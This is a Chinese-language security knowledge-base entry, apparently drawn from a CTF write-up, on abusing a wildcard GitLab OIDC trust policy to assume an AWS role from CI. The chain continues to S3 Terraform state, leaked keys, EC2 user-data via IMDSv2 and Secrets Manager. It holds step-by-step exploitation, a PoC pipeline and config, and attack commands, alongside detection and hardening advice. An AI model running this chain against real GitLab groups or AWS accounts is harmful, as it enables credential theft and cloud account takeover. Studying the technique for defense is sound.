---
id: cloud-cicd-gitlab-oidc-wildcard-sub-aws-role-assumption
title: GitLab OIDC 通配符信任滥用：组内任意项目 CI 作业代入 AWS 角色并窃取 S3 凭据
type: scenario
domain: cloud
path: cloud/ci-cd
technique: gitlab-oidc-wildcard-sub-aws-role-assumption
aliases:
- GitLab OIDC 信任滥用
- gitlab.com:sub project_path 通配符
- AssumeRoleWithWebIdentity 滥用
- CI 作业代入 AWS 角色
- gitlab_terraform_deploy
- GitLab CI 窃取 AWS 凭据
tags:
- cloud
- aws
- gitlab
- oidc
- ci-cd
- iam
- role-assumption
- s3
- credential
- trust-policy
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V217
  verified_at: '2026-11-07T04:20:44+08:00'
  notes: 已对照原文与全部 36 张截图核对：信任策略 StringLike project_path:huge-logistics/*、id_tokens+CI 变量配置、Job 日志 AssumeRoleWithWebIdentity、S3 sync 泄露 Terraform state、louise→engineering→EC2 user-data→bob→Secrets Manager 链均与原文一致；未验证点：CTF 环境一次性复现，账号/密钥为靶场数据，未在真实环境复测。
---

## 一句话结论

当 AWS IAM 角色的信任策略用 `StringLike gitlab.com:sub = "project_path:<org>/*"` 把整个 GitLab 组设为信任边界时，组内任意一个低权限/休眠项目的维护者都能修改 `.gitlab-ci.yml`，用 `id_tokens` 申请 `aud=https://gitlab.com` 的 OIDC token，再通过 `AWS_CONFIG_FILE`/`ROLE_ARN`/`web_identity_token` 让 AWS CLI 自动 `AssumeRoleWithWebIdentity`；随后在 CI 作业里用该角色 `aws s3 sync` 拉取包含 Terraform state 的桶，把 state 中的 IAM AK/SK 作为 artifacts 带出，继续跨账号/角色链直到 Secrets Manager。

## 原理

- **OIDC 联邦的信任边界在 `sub` 条件**：GitLab 作为 OIDC 提供者，CI 作业可申请 ID token；AWS IAM 角色的 `AssumeRoleWithWebIdentity` 会校验 token 的 `iss`、`aud` 与 `sub`。策略写成：
  - `StringEquals gitlab.com:aud = "https://gitlab.com"`；
  - `StringLike gitlab.com:sub = "project_path:huge-logistics/*"`。
  `sub` 里包含项目路径；`project_path:<org>/*` 的 `StringLike` 会匹配该组下**所有**项目，包括低权限、废弃、测试项目。攻击者只要拿到组内任意一个项目的 CI 编辑/运行权限，就能满足信任条件，不需要接触高权限或核心仓库。
- **为什么组内低权项目足够**：CI 作业的 OIDC token 由 GitLab  Runner 签发，claims 反映的是“哪个项目在跑 pipeline”，而不是“谁触发的”。因此恶意贡献者、被接管的低权项目或一个废弃仓库都可以成为代入角色的跳板。
- **AWS CLI 的 web identity 配置**：在 GitLab 项目 `Settings → CI/CD → Variables` 中添加：
  - `ROLE_ARN` = `arn:aws:iam::<account>:role/gitlab_terraform_deploy`；
  - `web_identity_token`（File 类型）= `${GITLAB_OIDC_TOKEN}`；
  - `AWS_CONFIG_FILE`（File 类型）= `[profile oidc]` + `role_arn=${ROLE_ARN}` + `web_identity_token_file=${web_identity_token}`。
  `.gitlab-ci.yml` 声明 `id_tokens: GITLAB_OIDC_TOKEN: aud: https://gitlab.com`，并设置 `AWS_PROFILE=oidc`；`amazon/aws-cli` 镜像里的 `aws sts get-caller-identity` 就会读取 token 文件、调用 `AssumeRoleWithWebIdentity` 并返回临时凭证。
- **从角色权限到数据外带**：原文角色可列 S3；`aws s3 ls` 发现 bucket，`aws s3 sync` 把桶内容拉到工作目录，`artifacts: paths` 让 GitLab 保存并允许从 Job 页面下载这些文件。桶里的 `backup.txt` 是 Terraform state，包含 `aws_iam_access_key` 的 `id`/`secret` 以及 SES SMTP 密码；state 是“基础设施即代码”的常见副产物，往往比业务数据更敏感。
- **后续横向链**：louise 的密钥属于另一个账号，且 `engineering` 角色的信任策略允许 `louise`/`bob` 代入；代入后用 `ec2:DescribeInstances` 找到实例，借助桶里的 `ec2.pem` SSH 登录；实例启用 IMDSv2，取 token 后读 `user-data`，其中硬编码了 bob 的 AK/SK；bob 有 `secretsmanager:GetSecretValue`，最终读取 flag。整条链的关键是“角色信任过宽 + CI 配置可改 + state/用户数据泄露长期密钥”。
- **AWS 2025 年 6 月的 secure-by-default 变化**：新创建/修改的共享 OIDC 提供者角色默认要求校验 `sub` 与 `aud`，本文角色已有这两项条件，但 `sub` 使用组织级通配符，条件“存在”不等于“足够窄”。
- **为什么 CI 变量配置有效**：GitLab 会把 File 类型变量落成临时文件，`${GITLAB_OIDC_TOKEN}` 在作业运行时展开；`AWS_CONFIG_FILE` 指向的 profile 让 AWS CLI 无需手工传 `--web-identity-token`，降低了作业里的命令特征。

## 触发条件

- IAM 角色信任策略 federated 到 `gitlab.com`，且 `gitlab.com:sub` 使用 `StringLike` 匹配到组织/组级通配符（如 `project_path:<org>/*`），而不是具体项目、分支或 environment。
- 攻击者能访问该 GitLab 组下任意项目的 CI 配置（至少 Maintainer 可编辑 `.gitlab-ci.yml` 并运行 pipeline；部分配置允许 Developer 触发受保护分支/变量时门槛更低）。
- 目标 AWS 账号 ID 与角色 ARN 可被发现（IAM 枚举、CloudFox、公开错误信息、CI 模板等）。
- GitLab Runner 可出网访问 AWS STS；作业允许使用 `id_tokens`。
- 角色权限包含可读的 S3/Secrets/EC2 等资源，或能继续代入其他角色。

## 利用步骤

1. **枚举 AWS 环境**：`aws sts get-caller-identity` 确认初始身份；若 `iam:ListAttachedUserPolicies` 被拒，用 CloudFox `cloudfox aws all-checks`（或 `cloudfox aws -p <profile> iam-simulator`）收集 users/roles，读取缓存的 `ListRoles` 与 `GetRole`，查找带 `Federated: oidc-provider/gitlab.com` 的角色。
2. **识别过宽信任**：重点看 `AssumeRolePolicyDocument` 的 `Condition`：`gitlab.com:sub` 是否为 `StringLike` + `project_path:<org>/*`，`aud` 是否为 `https://gitlab.com`；记录 `ROLE_ARN`。
3. **准备 GitLab 项目变量**：在组内任意可控项目的 `Settings → CI/CD → Variables` 添加 `ROLE_ARN`、`web_identity_token`（File，值为 `${GITLAB_OIDC_TOKEN}`）、`AWS_CONFIG_FILE`（File，值为 `[profile oidc]` + `role_arn=${ROLE_ARN}` + `web_identity_token_file=${web_identity_token}`）。
4. **编写流水线**：在 `.gitlab-ci.yml` 中声明 `id_tokens.GITLAB_OIDC_TOKEN.aud: https://gitlab.com`，使用 `amazon/aws-cli:latest` 镜像、`AWS_PROFILE: oidc`，`script: aws sts get-caller-identity`；提交到 main 并运行。
5. **确认代入**：Job 日志中出现 `arn:aws:sts::<account>:assumed-role/<role>/...`；随后把 script 改为 `aws s3 ls` 枚举桶，再改为 `aws s3 sync s3://<bucket>/ .` 并配置 `artifacts.paths` 下载文件。
6. **解析 state 与横向**：检查下载的 Terraform state/备份，提取 `aws_iam_access_key` 的 id/secret、SES SMTP 密码、SSH 私钥；配置凭证后 `aws sts get-caller-identity` 确认新身份，枚举其可代入的角色（`aws iam get-role` 看信任策略），用 `aws sts assume-role` 继续。
7. **接管实例与凭据**：`aws ec2 describe-instances` 找实例，使用 state 中的私钥 SSH；IMDSv2 下先 `PUT /latest/api/token` 再读 `user-data`，提取硬编码的 AK/SK；最后用高权限身份 `aws secretsmanager get-secret-value` 读取目标 secret。
8. **清理**：删除新增 CI 变量、还原 `.gitlab-ci.yml`、删除 pipeline/artifacts 与下载的 state；注意 GitLab 审计日志与 CloudTrail 已留痕。

## PoC

```yaml
# .gitlab-ci.yml（原文结构）
variables:
  AWS_DEFAULT_REGION: us-east-1
  AWS_PROFILE: "oidc"

oidc:
  image:
    name: amazon/aws-cli:latest
    entrypoint: [""]
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.com
  script:
    - aws sts get-caller-identity
```

```text
# AWS_CONFIG_FILE（File 类型变量）内容
[profile oidc]
role_arn=${ROLE_ARN}
web_identity_token_file=${web_identity_token}

# ROLE_ARN 示例
arn:aws:iam::573909305106:role/gitlab_terraform_deploy

# web_identity_token（File 类型）内容
${GITLAB_OIDC_TOKEN}
```

```bash
# 枚举与利用（作业内逐步替换 script）
cloudfox aws all-checks
aws sts get-caller-identity
aws s3 ls
aws s3 sync s3://huge-logistics-engineering-db3ba0baab43/ .
# artifacts.paths: backup.txt / ec2.pem
# 后续：aws sts assume-role --role-arn ... --role-session-name ...; aws ec2 describe-instances
# IMDSv2: TOKEN=$(curl -X PUT .../latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); curl -H ... .../user-data
```

说明：PoC 为原文 CTF 环境的结构化复现，未在本机执行；原文 Job 日志显示成功代入 `gitlab_terraform_deploy`、`aws s3 ls` 发现桶、`aws s3 sync` 下载 `backup.txt` 与 `ec2.pem`，随后完成跨账号角色链并读取 Secrets Manager 中的 flag。

## 变体与关联

- 变体（IdP/条件）：GitHub Actions 的 `token.actions.githubusercontent.com:sub` 若写成 `repo:<org>/*` 同理；其他 OIDC 提供者也可能用组织级通配符。条件是 `StringLike` 而非 `StringEquals`、缺少 `aud`、或只校验 `iss` 都会放大信任边界。
- 变体（入口）：组内低权项目、废弃仓库、fork/MR 流水线、可编辑 CI 的恶意贡献者；如果项目允许 MR pipeline 使用受保护变量，门槛更低。
- 变体（外带）：`aws s3 sync` + artifacts、直接 `curl` 外传、把 state 内容写进 Job 日志、通过 `secretsmanager` 读取更多凭据。
- 关联：[[cloud-cicd-github-actions-pull-request-target-checkout-rce]]（CI 上下文与权限过大的另一类问题）；[[cloud-cloud-iam-aws-dangerous-permission-privesc]]（角色权限组合提权）；[[cloud-cloud-iam-aws-access-key-leak-search-engine-takeover]]（AK/SK 泄露后的接管）；[[cloud-s3-presigned-url-vpce-bypass]]（拿到凭证后的 S3 读取限制绕过）。
- 边界：信任策略限定到具体项目/分支/environment 时失效；目标角色无 S3/Secrets 权限、Runner 不出网、项目禁止编辑 CI 或受保护变量只对受保护分支开放且攻击者无法推送时链断；GitLab 审计与 AWS CloudTrail 会记录 OIDC 代入。

## 检测与防御

- 防御（AWS 信任策略）：把 `sub` 收窄到 `project_path:<org>/<repo>:ref_type:branch:ref:main` 或 `environment:<env>`；使用 `StringEquals` 精确匹配；保留 `aud` 校验；不同环境/角色使用不同项目与分支；定期审计所有 `oidc-provider/gitlab.com` 角色。
- 防御（GitLab）：限制组内谁能编辑 `.gitlab-ci.yml`、运行 pipeline 与读取受保护变量；保护默认分支；开启合并请求审批；监控 CI 配置变更与 OIDC token 签发审计事件；定期清理废弃项目与外部成员。
- 检测（AWS）：CloudTrail 监控 `AssumeRoleWithWebIdentity` 的 `roleArn`、源 IP、userAgent（GitLab Runner）与后续 `s3:GetObject`/`secretsmanager:GetSecretValue`；对非常规项目路径的代入、短时间大量 S3 列举、Terraform state 桶访问告警。
- 检测（GitLab）：Job 日志中出现 `aws sts`、`s3 sync`、`secretsmanager`、`AWS_CONFIG_FILE` 等；新增 CI/CD 变量与 `.gitlab-ci.yml` 提交；Runner 对 AWS STS 的出站连接。
- 凭据治理：不要把长期 AK/SK 写入 Terraform state、用户数据或 CI 变量；使用短期角色与 Secrets Manager 轮换；对 state 桶加密并限制读权限；开启 S3 访问日志与 GuardDuty。
